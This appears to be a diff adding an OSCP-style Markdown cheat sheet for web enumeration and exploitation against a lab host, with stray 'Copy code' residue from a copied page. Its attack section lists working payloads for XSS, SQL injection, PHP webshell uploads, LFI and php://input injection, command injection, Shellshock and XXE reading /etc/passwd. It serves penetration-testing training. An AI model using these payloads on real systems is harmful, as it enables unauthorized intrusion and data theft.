@@ -1,0 +1,237 @@
+# Web Application Enumeration & Exploitation Notes (OSCP-Ready)
+
+> Use this when a target exposes HTTP(S). One-liners auto-create output folders under `scans/<TARGET>` so you keep evidence organized for the report.
+
+- **Covers**: Module 8 web methodology & tools (Nmap, Wappalyzer, Gobuster, Burp), enumeration (headers, cookies, source, APIs), and core attacks (**XSS**, **SQLi**, **LFI/RFI**, **File-upload**, **SSTI**, **XXE**, **Cmd-inj**), with **post-exploitation evidence** habits.  
+- **Why this format**: candidates pass more reliably with **one organized notes repo** vs scattered PDFs/Notion.  
+- **HTB web labs**: practice flow aligns with typical HTB web boxes (**manual**, **no metasploit**).
+
+---
+
+## 0) Quickstart (create workspace once)
+
+```bash
+# change 10.10.10.5 as needed per host
+mkdir -p scans/10.10.10.5/http scans/10.10.10.5/notes
+Mistake → Fix — Messy evidence & missing screenshots/logs → Always log output into scans/<host>/... as you go; it saves hours when writing the report.
+
+1) Fingerprint the Web Stack
+1.1 Nmap service & quick fingerprint (port 80/443)
+bash
+Copy code
+mkdir -p scans/10.10.10.5/http && \
+nmap -p80,443 -sV --script=http-enum -oA scans/10.10.10.5/http/nmap_http 10.10.10.5
+Finds server/version and common folders quickly (e.g., /uploads/, /db/).
+
+Mistake → Fix — Only relying on one scan → run targeted scripts after initial -sV; verify results manually to avoid false positives.
+
+1.2 Tech stack (whatweb) + headers
+bash
+Copy code
+whatweb http://10.10.10.5 | tee scans/10.10.10.5/http/whatweb.txt
+curl -i -s http://10.10.10.5 | tee scans/10.10.10.5/http/headers_http.txt
+Look for Server, X-Powered-By, framework hints—steer payloads and version-specific vulns.
+
+1.3 Wappalyzer (GUI/extension)
+Use the browser extension to confirm libraries & versions (jQuery, React, backend).
+
+(If browser isn’t available, rely on whatweb + static file hints.)
+
+2) Content Discovery (dirs/files, sitemaps, robots)
+2.1 Gobuster directory brute force (gentle threads)
+bash
+Copy code
+gobuster dir -u http://10.10.10.5 \
+  -w /usr/share/wordlists/dirb/common.txt -t 10 \
+  -o scans/10.10.10.5/http/gobuster_common.txt
+Map public files/dirs before exploits.
+
+Mistake → Fix — Only fuzzing “/” and missing vhosts/alt ports/backups → include the Relative Web Paths list below and test vhosts when any domain is known (SSL certs/headers).
+
+2.2 Robots & sitemaps
+bash
+Copy code
+curl -s http://10.10.10.5/robots.txt  | tee scans/10.10.10.5/http/robots.txt
+curl -s http://10.10.10.5/sitemap.xml | tee scans/10.10.10.5/http/sitemap.xml
+Often leak admin panels or hidden routes.
+
+3) Curated Relative Web Paths (OSCP quick wins)
+Path	Likely contents	Quick tell
+/dev/	test tools, phpbash.php, debug endpoints	Gobuster hits with “dev/test” names
+/uploads/	user uploads; sometimes executable	upload feature present; weak MIME
+/backup/, /backups/	.zip, .tar, .sql, .bak, old config	brute shows backups/old files
+/admin/, /administrator/	admin UIs, default creds	matches stack (e.g., /wp-admin)
+/config/, /configs/	YAML/INI/PHP configs with creds	curl & grep pass|user|key
+/old/, /tmp/, /test/	legacy / scratch code	directory listing enabled
+/.git/, /.svn/	repo histories / leaks	try /.git/HEAD, consider dump
+/api/, /v1/	JSON APIs	curl returns {...} bodies
+
+Mistake → Fix — Ignoring low-hanging dirs → check them immediately for quick shells/creds.
+
+4) Web Proxying & Manual Testing (Burp Suite CE)
+Launch Burp (Kali menu or burpsuite), set Proxy 127.0.0.1:8080; in Firefox set the same.
+
+Use Proxy → HTTP history, Repeater, and (light) Intruder to modify & replay requests.
+
+Mistake → Fix — Leaving Intercept ON and browser hangs → Disable Intercept except when you need to modify a request.
+
+5) API Enumeration (black-box)
+5.1 Pattern brute-force for /api/<name>/v1
+bash
+Copy code
+cat > scans/10.10.10.5/http/api.pattern << 'EOF'
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+EOF
+
+gobuster dir -u http://10.10.10.5:5001 \
+  -w /usr/share/wordlists/dirb/big.txt \
+  -p scans/10.10.10.5/http/api.pattern \
+  -o scans/10.10.10.5/http/gobuster_api.txt
+Look for /users/v1, /books/v1, /ui, etc.
+
+5.2 Probe endpoints with curl (JSON)
+bash
+Copy code
+curl -i http://10.10.10.5:5001/users/v1 | tee scans/10.10.10.5/http/api_users_v1.txt
+Mistake → Fix — GET returns 405 Method Not Allowed → retry with -X POST or -X PUT (405 = endpoint exists, wrong verb).
+
+6) Common Attack Checks (manual first)
+Keep to manual exploitation first (aligns with OSCP rules). Save each proof output.
+
+6.1 XSS (stored/reflected)
+bash
+Copy code
+# reflected
+curl -G --data-urlencode 'q=<script>alert(1)</script>' http://10.10.10.5/search
+# stored via headers (send through Burp or curl)
+curl -i -s http://10.10.10.5/ -H "User-Agent: <script>alert(42)</script>"
+Mistake → Fix — Treating alert() as the end goal → use XSS to escalate (steal session if not HttpOnly; nonce/CSRF abuse), or to discover admin-only paths.
+
+6.2 SQL Injection (union/boolean/time-based)
+bash
+Copy code
+# union test
+curl "http://10.10.10.5/item.php?id=1 UNION SELECT 1,2,3-- "
+# boolean
+curl "http://10.10.10.5/item.php?id=1' AND '1'='1-- "
+# time
+curl "http://10.10.10.5/item.php?id=1 AND SLEEP(5)-- "
+Adjust columns using ORDER BY n, then leak database(), user(), etc.
+
+6.3 File Upload bypasses
+bash
+Copy code
+# Try alternative extensions / suffixes
+curl -F "file=@shell.php.jpg" http://10.10.10.5/upload
+
+# Magic bytes trick (prepend GIF header)
+printf "GIF89a;\n<?php system('id'); ?>" > shell.php.gif
+curl -F "file=@shell.php.gif" http://10.10.10.5/upload
+Also try .phtml, .php5, changing Content-Type: image/jpeg.
+
+6.4 LFI/RFI
+bash
+Copy code
+# LFI
+curl "http://10.10.10.5/index.php?page=../../../../etc/passwd"
+# PHP filter to read source
+curl "http://10.10.10.5/index.php?page=php://filter/convert.base64-encode/resource=index.php"
+# php://input (code injection)
+curl -X POST "http://10.10.10.5/index.php?page=php://input" -d "<?php system('id'); ?>"
+6.5 Command Injection
+bash
+Copy code
+curl "http://10.10.10.5/ping.php?host=127.0.0.1;id"
+Fuzz headers too: User-Agent, Referer, X-Forwarded-For.
+
+For Shellshock:
+
+bash
+Copy code
+curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://10.10.10.5/cgi-bin/status
+6.6 SSTI (e.g., Jinja2/Twig)
+bash
+Copy code
+# detection
+curl "http://10.10.10.5/page?name={{7*7}}"
+If evaluated → escalate with object traversal → RCE.
+
+6.7 XXE (XML)
+Save as scans/10.10.10.5/http/xxe.xml:
+
+xml
+Copy code
+<?xml version="1.0"?>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+POST:
+
+bash
+Copy code
+curl -H 'Content-Type: application/xml' \
+     --data-binary @scans/10.10.10.5/http/xxe.xml \
+     http://10.10.10.5/upload-xml
+Mistake → Fix — Jumping to scanners first → enumerate → form hypothesis → test minimal, reproducible payloads. Examiners value manual, explainable steps.
+
+7) Browser Developer Tools (fast insights)
+Inspector / Debugger: pretty-print minified JS, find hidden inputs and client logic.
+
+Network: check headers (Server/CSP/X-Powered-By), status redirects (301/302), and request flow.
+
+Mistake → Fix — Skipping the browser and only using curl → DevTools reveal DOM/JS behaviors you won’t see from CLI alone.
+
+8) Evidence & Reporting Habits (do this live)
+bash
+Copy code
+# Log a whole session (Linux)
+script -f scans/10.10.10.5/term.log
+# When done:
+exit
+Screenshot every: whoami, hostname, ip, and flag/proof screen; missing proof screenshots = lost points.
+
+Mistake → Fix — Writing the report at the end from memory → write notes as you go and drop images into scans/<host>/screens/.
+
+9) “Mistake → Fix” Cheats (web-specific)
+Over-reliance on automation → Autorecon can drown you in noise; keep manual playbooks front & center.
+
+Ignoring low-hanging fruit → try anonymous areas, backups, default creds before complex chains.
+
+No UDP checks → some webservices depend on SNMP/TFTP footprints that lead back into web creds.
+
+Not pivoting → if nothing in 90–120 min, switch to another service/host; come back later.
+
+Scattered notes → one repo, consistent layout; searchable Markdown beats many PDFs.
+
+10) Minimal Post-Foothold Checklist (web shell gained)
+bash
+Copy code
+# Windows (save output)
+whoami /all & systeminfo & ipconfig /all & route print & arp -a & tasklist > post_enum_windows.txt
+
+# Linux (save output)
+( whoami; id; uname -a; cat /etc/os-release; ip -a || ifconfig -a; \
+  ip r || route -n; ss -tulpn || netstat -tulpn ) > post_enum_linux.txt
+Then hunt configs/creds, scheduled tasks/cron, SUID/unquoted paths, browser stores, etc.
+
+11) One-Command “All-in” Web Kickoff
+Safe starter that fingerprints, enumerates, and leaves neat artifacts:
+
+bash
+Copy code
+TARGET=10.10.10.5; mkdir -p scans/$TARGET/http && \
+whatweb http://$TARGET | tee scans/$TARGET/http/whatweb.txt && \
+curl -i -s http://$TARGET | tee scans/$TARGET/http/headers_http.txt && \
+gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -t 10 \
+  -o scans/$TARGET/http/gobuster_common.txt && \
+curl -s http://$TARGET/robots.txt | tee scans/$TARGET/http/robots.txt
+12) Practice Targets (manual, OSCP-like)
+Re-implement this flow on HTB retired web boxes without metasploit; focus on enumeration → minimal exploit → proof.
+
+References
+PEN-200 Modules (esp. 8: Web Methodology/Tools/Enumeration/XSS)
+
+Service Enumeration Cards (HTTP paths & per-service mini-playbooks)
+
+OSCP 2023–2025 Fail Patterns (notes hygiene, timeboxing, low-hanging fruit, anti-overreliance on automation, proof screenshots)
+
